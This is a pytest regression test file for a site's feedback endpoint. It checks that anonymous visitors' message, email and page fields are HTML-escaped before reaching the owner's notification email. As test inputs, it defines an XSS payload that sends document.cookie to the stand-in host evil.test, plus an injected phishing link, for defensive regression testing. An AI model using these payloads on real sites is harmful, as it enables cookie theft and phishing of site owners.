"""An anonymous visitor's text must not reach the owner's inbox as live markup (#373).

WHY THIS IS HERE, given the charter in conftest.py.

This is a defect that shipped. `POST /feedback` needs no authentication,
`feedback.add` caps the message at 2,000 characters and sanitises nothing, and
`routes/feedback.py` interpolated `message`, `email` and `page` straight into an
HTML email body. That mail is sent through the site's own Brevo sender, so it
carries valid SPF and DKIM and renders in the owner's client as a genuine Shubh
Bhagya notification. Mail clients strip `<script>`, but `<a href>`, a remote
`<img>` and a styled block all render -- enough to spoof one convincingly.

Nothing exercised the composed body, which is why three unescaped fields sat
there. These tests capture what `email_sender.send` would have been given.
"""
from __future__ import annotations

import pytest

from astro_ai import feedback as feedback_store
from astro_ai.routes import feedback as feedback_route


PAYLOAD = '<img src=x onerror="fetch(\'//evil.test/?c=\'+document.cookie)">'


@pytest.fixture
def sent(monkeypatch):
    """Capture the email body instead of sending it."""
    box: list[dict] = []
    monkeypatch.setattr(feedback_route.email_sender, "send",
                        lambda to, **kw: box.append({"to": to, **kw}) or True)
    monkeypatch.setattr(feedback_route.notify, "feedback_submitted", lambda **kw: None)
    monkeypatch.setenv("BHAGYA_EMAIL_FROM", "owner@example.test")
    return box


def _submit(monkeypatch, sent, **fields):
    entry = {"type": "problem", "message": "", "email": "", "page": "",
             "ts": "2026-10-15T00:00:00Z", "id": "abc123"}
    entry.update(fields)
    monkeypatch.setattr(feedback_store, "add",
                        lambda **kw: (True, "", entry))
    import asyncio

    class _Req:
        headers: dict = {}

    asyncio.get_event_loop_policy().new_event_loop().run_until_complete(
        feedback_route.submit_feedback(_Req(), **{
            "type": entry["type"], "message": entry["message"],
            "email": entry["email"], "page": entry["page"]}))
    assert sent, "no email was composed"
    return sent[-1]["html"]


def test_a_script_payload_in_the_message_does_not_survive_as_markup(monkeypatch, sent):
    body = _submit(monkeypatch, sent, message=PAYLOAD)
    assert "<img" not in body
    assert "onerror" not in body or "&quot;" in body
    # The text is still THERE, just inert -- the owner must be able to read what
    # was actually submitted, which is the whole point of the notification.
    assert "&lt;img" in body


@pytest.mark.parametrize("field", ["message", "email", "page"])
def test_every_visitor_supplied_field_is_escaped(monkeypatch, sent, field):
    body = _submit(monkeypatch, sent, **{field: '<b>x</b>"q"'})
    assert "<b>x</b>" not in body
    assert "&lt;b&gt;x&lt;/b&gt;" in body


def test_an_anchor_cannot_be_injected_into_the_owners_mail(monkeypatch, sent):
    # The phishing shape: a link that looks like it came from the site.
    body = _submit(monkeypatch, sent, message='<a href="//evil.test">Reset your password</a>')
    assert "<a href" not in body


def test_the_page_and_email_placeholders_still_work_when_empty(monkeypatch, sent):
    body = _submit(monkeypatch, sent, message="hello")
    assert "unknown page" in body and "(anonymous)" in body


def test_storage_keeps_the_raw_text(monkeypatch, sent):
    # Escaping belongs where the markup is built, not in the store: /admin/feedback
    # needs what the visitor actually typed, and a double-escaped record is a
    # record that lies about the submission.
    captured = {}
    monkeypatch.setattr(feedback_store, "add",
                        lambda **kw: captured.update(kw) or (False, "stop", None))
    import asyncio

    class _Req:
        headers: dict = {}

    asyncio.get_event_loop_policy().new_event_loop().run_until_complete(
        feedback_route.submit_feedback(_Req(), type="problem", message=PAYLOAD,
                                       email="", page=""))
    assert captured["message"] == PAYLOAD
